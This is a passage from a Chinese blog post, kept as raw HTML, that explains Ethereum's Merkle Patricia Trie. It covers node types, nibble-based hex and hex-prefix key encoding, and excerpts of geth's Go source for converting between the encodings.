xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。且一次查找会有 m 次 <code>IO</code>开销，相比于直接查找，无论是速率、还是对磁盘的压力都比较大。</li><li>当存在一个节点，其内容很长（如一串很长的字符串），当树中没有与他相同前缀的分支时，为了存储该节点，需要创建许多非叶子节点来构建根节点到该节点间的路径，造成了存储空间的浪费。</li></ol><h1>压缩前缀树 Patricia Tree</h1><p><strong>基数树</strong>（也叫<strong>基数特里树</strong>或<strong>压缩前缀树</strong>）是一种数据结构，是一种更节省空间的<strong>前缀树</strong>，其中作为唯一子节点的每个节点都与其父节点合并，边既可以表示为元素序列又可以表示为单个元素。 因此每个内部节点的子节点数最多为基数树的基数 <em>r</em> ，其中 <em>r</em> 为正整数， <em>x</em> 为 2 的幂， <em>x</em>≥1 ，这使得基数树更适用于对于较小的集合（尤其是字符串很长的情况下）和有<strong>很长相同前缀</strong>的字符串集合。</p><ol><li>示例 1：</li></ol><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162035687.png" alt="image-20220330162035687"></p><p>图中可以很容易看出数中所存储的键值对：</p><ul><li><code>6c0a5c71ec20bq3w</code> =&gt; 5</li><li><code>6c0a5c71ec20CX7j</code> =&gt; 27</li><li><code>6c0a5c71781a1FXq</code>=&gt; 18</li><li><code>6c0a5c71781a9Dog</code> =&gt; 64</li><li><code>6c0a8f743b95zUfe</code> =&gt; 30</li><li><code>6c0a8f743b95jx5R</code> =&gt; 2</li><li><code>6c0a8f740d16y03G</code> =&gt; 43</li><li><code>6c0a8f740d16vcc1</code> =&gt; 48</li></ul><ol start="2"><li>示例 2：</li></ol><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162102535.png" alt="image-20220330162102535"></p><p>虽然基数树使得以相同字符序列开头的键的值在树中靠得更近，但是它们可能效率很低。 例如，当你有一个超长键且没有其他键与之共享前缀时，<code>即使路径上没有其他值，但你必须在树中移动（并存储）大量节点才能获得该值。 这种低效在以太坊中会更加明显，因为参与树构建的 Key 是一个哈希值有 64 长（32 字节）</code>，则树的最长深度是 64。树中每个节点必须存储 32 字节，一个 Key 就需要至少 2KB 来存储，其中包含大量空白内容。 因此，在经常需要更新的以太坊状态树中，优化改进基数树，以提高效率、降低树的深度和减少 IO 次数，是必要的。</p><h1>默克尔树 Merkle Tree</h1><p><code>Merkle树</code>看起来非常像二叉树，其叶子节点上的值通常为数据块的哈希值，而非叶子节点上的值，所以有时候<code>Merkle tree</code>也表示为<code>Hash tree</code>，如下图所示：<img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162144911.png" alt="image-20220330162144911"><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gm69qu5vh8j31ba0ragpn.jpg">https://tva1.sinaimg.cn/large/0081Kckwgy1gm69qu5vh8j31ba0ragpn.jpg</a>)</p><p>在构造<code>Merkle</code>树时，首先要计算数据块的哈希值，通常，选用<code>SHA-256</code>等哈希算法。但如果仅仅防止数据不是蓄意的损坏或篡改，可以改用一些安全性低(实际生活中<code>CRC16</code>基本达到 100%的正确率)但效率高的校验和算法，如<code>CRC</code>。然后将数据块计算的哈希值<strong>两两配对（如果是奇数个数，最后一个自己与自己配对）</strong>，计算<strong>上一层哈希</strong>，再重复这个步骤，一直到计算出根哈希值。</p><p>所以我们可以简单总结出<strong>merkle Tree</strong> 有以下几个性质：</p><ul><li>校验整体数据的正确性</li><li>快速定位错误</li><li>快速校验部分数据是否在原始的数据中</li><li>存储空间开销大（<strong>大量中间哈希</strong>）(显然对于以太坊很致命)</li></ul><h1>以太坊的改进方案</h1><h2 id="使用-byte-作为-key-类型">使用[]byte 作为 key 类型</h2><p>在以太坊的 Trie 模块中，key 和 value 都是[]byte 类型。如果要使用其它类型，需要将其转换成[]byte 类型（比如使用<strong>rlp</strong>进行转换）。</p><p><strong>Nibble</strong> ：是 key 的基本单元，是一个四元组（四个 bit 位的组合例如二进制表达的 0010 就是一个四元组）</p><p>在 Trie 模块对外提供的接口中，key 类型是[]byte。但在内部实现里，将 key 中的每个字节按高 4 位和低 4 位拆分成了两个字节。比如你传入的 key 是：</p><blockquote><p>[0x1a, 0x2b, 0x3c, 0x4d]</p></blockquote><p>Trie 内部将这个 key 拆分成：</p><blockquote><p>[0x1, 0xa, 0x2, 0xb, 0x3, 0xc, 0x4, 0xd]</p></blockquote><p>Trie 内部的编码中将拆分后的<strong>每一个字节</strong>称为 <strong>nibble</strong></p><p>如果使用一个完整的 byte 作为 key 的最小单位，那么前文提到的索引数组的大小应该是 256（byte 作为数组的索引，最大值为 255，最小值为 0）（8 位<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">2^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span> )。而索引数组的每个元素都是一个 32 字节的哈希,这样每个结点要占用大量的空间。并且索引数组中的元素多数情况下是空的，不指向任何结点。因此这种实现方法占用大量空间而不使用。以太坊的改进方法，可以将索引数组的大小降为 16（4 个 bit 的最大值为 0xF，最小值为 0）(4 位<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">2^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span> ），因此大大减少空间的浪费。</p><h2 id="新增类型节点">新增类型节点</h2><p>前缀树和 merkle 树存在明显的局限性，所以以太坊为 MPT 树新增了几种不同类型的树节点，通过针对不同节点不同操作来解决效率以及存储上的问题。</p><ol><li><p><strong>空白节点</strong> ：简单的表示空，在代码中是一个空串;NULL</p></li><li><p><strong>分支节点</strong> ：分支节点有 17 个元素，回到 Nibble，四元组是 key 的基本单元，<strong>四元组最多有 16 个值</strong>。所以前 16 个必将落入到在其遍历中的键的十六个可能的半字节值中的每一个。第 17 个是存储那些在当前结点<strong>结束了</strong>的节点(例如， 有三个 key,分别是 (abc ,abd, ab) 第 17 个字段储存了 ab 节点的值) ;</p><p><code>branch Node [0,1,…,16,value]</code></p></li><li><p><strong>叶子节点</strong>：只有两个元素，分别为 key 和 value;</p><p><code>leaf Node [key,value]</code></p></li><li><p><strong>扩展节点</strong> ：有两个元素，一个是 key 值，还有一个是 hash 值，这个 hash 值指向下一个节点;</p><p><code> extension Node: [key,value]</code></p></li></ol><p>此外，为了将 MPT 树存储到数据库中，同时还可以把 MPT 树从数据库中恢复出来，<strong>对于 Extension 和 Leaf 的节点类型做了特殊的定义</strong>：如果是一个扩展节点，那么前缀为 0，这个 0 加在 key 前面。如果是一个叶子节点，那么前缀就是 1。同时对<strong>key 的长度就奇偶类型也做了设定</strong>，如果是奇数长度则标示 1，如果是偶数长度则标示 0。</p><p>多种节点类型的不同操作方式，虽然提升了效率，但复杂度被加大。而在 geth 中，为了适应实现，节点类型的设计稍有不同：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//trie/node.go:35</span></span><br><span class="line"><span class="keyword">type</span> (</span><br><span class="line">fullNode <span class="keyword">struct</span> &#123; <span class="comment">//分支节点</span></span><br><span class="line">Children [<span class="number">17</span>]node</span><br><span class="line">flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line">shortNode <span class="keyword">struct</span> &#123; <span class="comment">//短节点：叶子节点、扩展节点</span></span><br><span class="line">Key   []<span class="type">byte</span></span><br><span class="line">Val   node</span><br><span class="line">flags nodeFlag</span><br><span class="line">&#125;</span><br><span class="line">hashNode  []<span class="type">byte</span> <span class="comment">//哈希节点</span></span><br><span class="line">valueNode []<span class="type">byte</span> <span class="comment">//数据节点,dui&#x27;ying值就是实际的数据值</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> nilValueNode = valueNode(<span class="literal">nil</span>) <span class="comment">//空白节点</span></span><br></pre></td></tr></table></figure><ul><li>fullNode: 分支节点，fullNode[16]的类型是 valueNode。前 16 个元素对应键中可能存在的一个十六进制字符。如果键[key,value]在对应的分支处结束，则在列表末尾存储 value 。</li><li>shortNode: 叶子节点或者扩展节点，当 shortNode.Key 的末尾字节是终止符 <code>16</code> 时表示为叶子节点。当 shortNode 是叶子节点是，Val 是 valueNode。</li><li>hashNode: 应该取名为 collapsedNode 折叠节点更合适些，但因为其值是一个哈希值当做指针使用，所以取名 hashNode。使用这个哈希值可以从数据库读取节点数据展开节点。</li><li>valueNode: 数据节点，实际的业务数据值，严格来说他不属于树中的节点，它只存在于 fullNode.Children 或者 shortNode.Val 中。</li></ul><h2 id="各类-Key">各类 Key</h2><p>在改进过程中，为适应不同场景应用，以太坊定义了几种不同类型的 key 。</p><ol><li>keybytes ：数据的原始 key</li><li>Secure Key: 是 Keccak256(keybytes) 结果，用于规避 key 深度攻击，长度固定为 32 字节。</li><li>Hex Key: 将 Key 进行半字节拆解后的 key ，用于 MPT 的树路径中和降低子节点水平宽度。</li><li>HP Key: Hex 前缀编码(hex prefix encoding)，在节点存持久化时，将对节点 key 进行压缩编码，并加入节点类型标签，以便从存储读取节点数据后可分辨节点类型。</li></ol><p>下图是 key 有特定的使用场景，基本支持逆向编码，在下面的讲解中 Key 在不同语义下特指的类型有所不同</p><h2 id="节点结构改进">节点结构改进</h2><p>当我们把一组数据（romane、romanus、romulus、rubens、ruber、rubicon、rubicunds）写入基数树中时，得到如下一颗基数树：</p><p><a href="https://img.learnblockchain.cn/book_geth/20191122001418.png!de?width=500px"><img src="https://img.learnblockchain.cn/book_geth/20191122001418.png!de?width=500px" alt="img" style="zoom:50%;" /></a></p><p>在上图的基数树中，持久化节点，有 12 次 IO。数据越多时，节点数越多，IO 次数越多。另外当树很深时，可能需要遍历到树的底部才能查询到数据。 面对此效率问题，以太坊在树中加入了一种名为<strong>分支节点</strong>(branch node) 的节点结构，将其子节点直接包含在自身的数据插槽中。</p><p>这样可缩减树深度和减少 IO 次数，特别是当插槽中均有子节点存在时，改进效果越明显。 下图是上方基数树在采用分支节点后的树节点逻辑布局：</p><p><a href="https://img.learnblockchain.cn/book_geth/20191122232439.png!de?width=400px&amp;heigth=400px"><img src="https://img.learnblockchain.cn/book_geth/20191122232439.png!de?width=400px&heigth=400px" alt="img" style="zoom: 50%;" /></a></p><p>从图中可以看出节点数量并无改进，仅仅是改变了节点的存放位置，节点的分布变得紧凑。图中大黑圆圈均为分支节点，它包含一个或多个子节点， 这降低了 IO 和查询次数，在上图中，持久化 IO 只有 6 次，低于基数树的 12 次。</p><p>这是因为在持久化分支节点时，并不是将叶子节点分开持久化，而是将其存储在一块。<strong>并将持久化内容的哈希值作为一个新节点来参与树的进一步持久化</strong>，这种新型的节点称之为<code>扩展节点</code>。比如，数据 rubicon(6) 和 rubicunds(7) 是被一起持久化，在查询数据 rubicon 时，将根据 hasNode 值从数据库中读取分支节点内容，并解码成分支节点，内含 rubicon 和 rubicunds。</p><p>另外一个可以参考的官方图：</p><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220327222113848.png" alt="image-20220327222113848"></p><p>另外，数据 Key 在进入 MPT 前已转换 Secure Key。 因此，key 长度为 32 字节，每个字节的值范围是[0 - 255]。 如果在分支节点中使用 256 个插槽，空间开销非常高，造成浪费，毕竟空插槽在持久化时也需要占用空间。同时超大容量的插槽，也会可能使得持久化数据过大，可能会造成读取持久化数据时占用过多内存。 如果将 Key 进行<a href="https://learnblockchain.cn/books/geth/part3/mpt.html#hex-encoding">Hex 编码</a>，每个字节值范围被缩小到 [0-15] 内(4bits)。这样，分支节点只需要 16 个插槽来存放子节点。</p><p>上图中 0 - f 插槽索引是半字节值，也是 Key 路径的一部分。虽然一定程度上增加了树高，但降低了分支节点的存储大小，也保证了一定的分支节点合并量。</p><h2 id="以太坊中使用到的-MPT-树结构">以太坊中使用到的 MPT 树结构</h2><ul><li><code>State Trie</code>区块头中的状态树<ul><li>key =&gt; sha3(以太坊账户地址 address)</li><li>value =&gt; rlp(账号内容信息 account)</li></ul></li><li><code>Transactions Trie</code> 区块头中的交易树<ul><li>key =&gt; rlp(交易的偏移量 transaction index)</li><li>每个块都有各自的交易树，且不可更改</li></ul></li><li><code>Receipts Trie</code>区块头中的收据树<ul><li>key = rlp(交易的偏移量 transaction index)</li><li>每个块都有各自的回执树，且不可更改</li></ul></li><li><code>Storage Trie</code>存储树<ul><li>存储只能合约状态</li><li>每个账号有自己的 Storage Trie</li></ul></li></ul><p>这两个区块头中，<code>state root</code>、<code>tx root</code>、 <code>receipt root</code>分别存储了这三棵树的树根，第二个区块显示了当账号 17 5 的数据变更(<strong>27 -&gt; 45</strong>)的时候，只需要存储跟这个账号相关的部分数据，而且老的区块中的数据还是可以正常访问。</p><h2 id="key-编码规则">key 编码规则</h2><p>三种编码方式分别为：</p><ol><li><strong>Raw</strong>编码（原生的字符）；</li><li><strong>Hex</strong>编码（扩展的 16 进制编码）；</li><li><strong>Hex-Prefix</strong>编码（16 进制前缀编码）；</li></ol><p><strong>Raw 编码</strong></p><p><strong>Raw</strong>编码就是原生的<strong>key</strong>值，不做任何改变。这种编码方式的<strong>key</strong>，<em>是<strong>MPT</strong>对外提供接口的默认编码方式</em>。</p><blockquote><p>例如一条 key 为“cat”，value 为“dog”的数据项，其 Raw 编码就是[‘c’, ‘a’, ‘t’]，换成 ASCII 表示方式就是[63, 61, 74]</p></blockquote><p><strong>Hex 编码</strong></p><p><em>Hex 编码用于对内存中 MPT 树节点 key 进行编码</em>.</p><p>为了减少分支节点孩子的个数，将数据 key 进行半字节拆解而成。即依次将 key[0],key[1],…,key[n] 分别进行半字节拆分成两个数，再依次存放在长度为 len(key)+1 的数组中。 并在数组末尾写入终止符 <code>16</code>。算法如下：</p><blockquote><p>半字节，在计算机中，通常将 8 位二进制数称为字节，而把 4 位二进制数称为半字节。 高四位和低四位，这里的“位”是针对二进制来说的。比如数字 250 的二进制数为 11111010，则高四位是左边的 1111，低四位是右边的 1010。</p></blockquote><p>从<strong>Raw</strong>编码向<strong>Hex</strong>编码的转换规则是：</p><ul><li><strong>Raw</strong>编码输入的每个字符分解为高 4 位和低 4 位</li><li>如果是<strong>叶子节点</strong>，则在最后加上<strong>Hex</strong>值<code>0x10</code>表示结束</li><li>如果是<strong>扩展节点</strong>不附加任何<strong>Hex</strong>值</li></ul><p>例如：字符串 “romane” 的 bytes 是 <code>[114 111 109 97 110 101]</code>，在 HEX 编码时将其依次处理：</p><table><thead><tr><th style="text-align:left">i</th><th style="text-align:left">key[i]</th><th style="text-align:left">key[i]二进制</th><th style="text-align:left">nibbles[i*2]=高四位</th><th style="text-align:left">nibbles[i*2+1]=低四位</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">114</td><td style="text-align:left">01110010</td><td style="text-align:left">0111= 7</td><td style="text-align:left">0010= 2</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">111</td><td style="text-align:left">01101111</td><td style="text-align:left">0110=6</td><td style="text-align:left">1111=15</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">109</td><td style="text-align:left">01101101</td><td style="text-align:left">0110=6</td><td style="text-align:left">1101=13</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">97</td><td style="text-align:left">01100001</td><td style="text-align:left">0110=6</td><td style="text-align:left">0001=1</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">110</td><td style="text-align:left">01101110</td><td style="text-align:left">0110=6</td><td style="text-align:left">1110=14</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">101</td><td style="text-align:left">01100101</td><td style="text-align:left">0110=6</td><td style="text-align:left">0101=5</td></tr></tbody></table><p>最终得到 Hex(“romane”) = <code>[7 2 6 15 6 13 6 1 6 14 6 5 16]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 源码实现</span><br><span class="line">func keybytesToHex(str []byte) []byte &#123;</span><br><span class="line">l := len(str)*2 + 1</span><br><span class="line">var nibbles = make([]byte, l)</span><br><span class="line">for i, b := range str &#123;</span><br><span class="line">nibbles[i*2] = b / 16   // 高四位</span><br><span class="line">nibbles[i*2+1] = b % 16 // 低四位</span><br><span class="line">&#125;</span><br><span class="line">nibbles[l-1] = 16 // 最后一位存入标示符 代表是hex编码</span><br><span class="line">return nibbles</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里解释一下为啥 不处理叶子节点和扩展结点的区别，而是直接采用<code>nibbles[l-1]=16</code>，因为扩展节点不储存字符串信息，所以说字符串转换的时候直接按叶子节点处理即可，但是<code>Hex</code>=&gt;<code>Hex Prefix</code>的时候要考虑是不是扩展结点的问题；</p></blockquote><p><strong>Hex-Prefix</strong>编码</p><p><strong>数学公式定义：</strong></p><p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gm75cvok4yj318s07iwfg.jpg"><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330161849571.png" alt="image-20220330161849571"></a></p><p>Hex-Prefix 编码是一种任意量的半字节转换为数组的有效方式，还可以在存入一个标识符来区分不同节点类型。 因此 HP 编码是在由一个标识符前缀和半字节转换为数组的两部分组成。存入到数据库中存在节点 Key 的只有扩展节点和叶子节点，因此 HP 只用于区分扩展节点和叶子节点，不涉及无节点 key 的分支节点。其编码规则如下图：</p><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162436055.png" alt="image-20220330162436055"></p><p>前缀标识符由两部分组成：节点类型和奇偶标识，并存储在编码后字节的第一个半字节中。 0 表示扩展节点类型，1 表示叶子节点，偶为 0，奇为 1。最终可以得到唯一标识的前缀标识：</p><ul><li>0：偶长度的扩展节点</li><li>1：奇长度的扩展节点</li><li>2：偶长度的叶子节点</li><li>3：奇长度的叶子节点</li></ul><p>当偶长度时，第一个字节的低四位用<code>0</code>填充，当是奇长度时，则将 key[0] 存放在第一个字节的低四位中，这样 HP 编码结果始终是偶长度。 这里为什么要区分节点 key 长度的奇偶呢？这是因为，半字节 <code>1</code> 和 <code>01</code> 在转换为 bytes 格式时都成为<code>&lt;01&gt;</code>，无法区分两者。</p><p>例如，上图 “以太坊 MPT 树的哈希计算”中的控制节点 1 的 key 为 <code>[ 7 2 6 f 6 d]</code>，因为是偶长度，则 HP[0]= (00000000) =0，H[1:]= 解码半字节(key)。 而节点 3 的 key 为 <code>[1 6 e 6 5]</code>，为奇长度，则 HP[0]= (0001 0001)=17。</p><p><strong>HP</strong>编码的规则如下：</p><ul><li>key 结尾为<strong>0x10</strong>，则去掉这个终止符</li><li>key 之前补一个四元组这个 Byte 第 0 位区分奇偶信息，第 1 位区分节点类型</li><li>如果输入<strong>key</strong>的长度是偶数，则再添加一个四元组 0x0 在 flag 四元组后</li><li>将原来的 key 内容压缩，将分离的两个 byte 以高四位低四位进行合并</li></ul><blockquote><p>十六进制前缀编码相当于一个逆向的过程，比如输入的是[6 2 6 15 6 2 16]，</p><p>根据第一个规则去掉终止符 16。根据第二个规则 key 前补一个四元组，从右往左第一位为 1 表示叶子节点，</p><p>从右往左第 0 位如果后面 key 的长度为偶数设置为 0，奇数长度设置为 1，那么四元组 0010 就是 2。</p><p>根据第三个规则，添加一个全 0 的补在后面，那么就是 20.根据第三个规则内容压缩合并，那么结果就是[0x20 0x62 0x6f 0x62]</p></blockquote><p><strong>HP 编码源码实现:</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hexToCompact</span><span class="params">(hex []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">terminator := <span class="type">byte</span>(<span class="number">0</span>) <span class="comment">//初始化一个值为0的byte，它就是我们上面公式中提到的t</span></span><br><span class="line"><span class="keyword">if</span> hasTerm(hex) &#123;     <span class="comment">//验证hex是否有后缀编码，</span></span><br><span class="line">terminator = <span class="number">1</span>         <span class="comment">//hex编码有后缀，证明是叶子节点，则t=1</span></span><br><span class="line">hex = hex[:<span class="built_in">len</span>(hex)<span class="number">-1</span>] <span class="comment">//此处只是去掉后缀部分的hex编码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Compact开辟的空间长度为hex编码的一半再加1，这个1对应的空间是Compact的前缀</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(hex)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="comment">////这一阶段的buf[0]可以理解为公式中的16*f(t)</span></span><br><span class="line">    <span class="comment">//判断节点类型</span></span><br><span class="line">buf[<span class="number">0</span>] = terminator &lt;&lt; <span class="number">5</span> <span class="comment">// the flag byte</span></span><br><span class="line">    <span class="comment">//判断jiou</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(hex)&amp;<span class="number">1</span> == <span class="number">1</span> &#123;     <span class="comment">//hex 长度为奇数，则逻辑上说明hex有前缀</span></span><br><span class="line">buf[<span class="number">0</span>] |= <span class="number">1</span> &lt;&lt; <span class="number">4</span> <span class="comment">////这一阶段的buf[0]可以理解为公式中的16*（f(t)+1）</span></span><br><span class="line">buf[<span class="number">0</span>] |= hex[<span class="number">0</span>] <span class="comment">// first nibble is contained in the first byte</span></span><br><span class="line">hex = hex[<span class="number">1</span>:]    <span class="comment">//此时获取的hex编码无前缀无后缀</span></span><br><span class="line">&#125;</span><br><span class="line">decodeNibbles(hex, buf[<span class="number">1</span>:]) <span class="comment">//将hex编码映射到compact编码中</span></span><br><span class="line"><span class="keyword">return</span> buf                  <span class="comment">//返回compact编码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//compact编码转化为Hex编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compactToHex</span><span class="params">(compact []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(compact) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> compact</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进行展开即可</span></span><br><span class="line">base := keybytesToHex(compact)</span><br><span class="line"></span><br><span class="line"><span class="comment">// apply terminator flag</span></span><br><span class="line"><span class="comment">// base[0]包括四种情况</span></span><br><span class="line"><span class="comment">// 00000000 扩展节点偶数位</span></span><br><span class="line"><span class="comment">// 00000001 扩展节点奇数位</span></span><br><span class="line"><span class="comment">// 00000010 叶子节点偶数位</span></span><br><span class="line"><span class="comment">// 00000011 叶子节点奇数位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// delete terminator flag</span></span><br><span class="line"><span class="keyword">if</span> base[<span class="number">0</span>] &lt; <span class="number">2</span> &#123; <span class="comment">//扩展结点</span></span><br><span class="line">base = base[:<span class="built_in">len</span>(base)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// apply odd flag</span></span><br><span class="line"><span class="comment">//如果是偶数位，chop等于2，否则等于1</span></span><br><span class="line">chop := <span class="number">2</span> - base[<span class="number">0</span>]&amp;<span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> base[chop:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将keybytes 转成十六进制</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">keybytesToHex</span><span class="params">(str []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    l := <span class="built_in">len</span>(str)*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">     <span class="comment">//将一个keybyte转化成两个字节</span></span><br><span class="line">    <span class="keyword">var</span> nibbles = <span class="built_in">make</span>([]<span class="type">byte</span>, l)</span><br><span class="line">    <span class="keyword">for</span> i, b := <span class="keyword">range</span> str &#123;</span><br><span class="line">        nibbles[i*<span class="number">2</span>] = b / <span class="number">16</span></span><br><span class="line">        nibbles[i*<span class="number">2</span>+<span class="number">1</span>] = b % <span class="number">16</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//末尾加入Hex标志位16</span></span><br><span class="line">    nibbles[l<span class="number">-1</span>] = <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> nibbles</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制的bibbles转成key bytes，这只能用于偶数长度的key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hexToKeybytes</span><span class="params">(hex []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> hasTerm(hex) &#123;</span><br><span class="line">        hex = hex[:<span class="built_in">len</span>(hex)<span class="number">-1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex)&amp;<span class="number">1</span> != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;can&#x27;t convert hex key of odd length&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    key := <span class="built_in">make</span>([]<span class="type">byte</span>, (<span class="built_in">len</span>(hex)+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    decodeNibbles(hex, key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeNibbles</span><span class="params">(nibbles []<span class="type">byte</span>, bytes []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> bi, ni := <span class="number">0</span>, <span class="number">0</span>; ni &lt; <span class="built_in">len</span>(nibbles); bi, ni = bi+<span class="number">1</span>, ni+<span class="number">2</span> &#123;</span><br><span class="line">        bytes[bi] = nibbles[ni]&lt;&lt;<span class="number">4</span> | nibbles[ni+<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 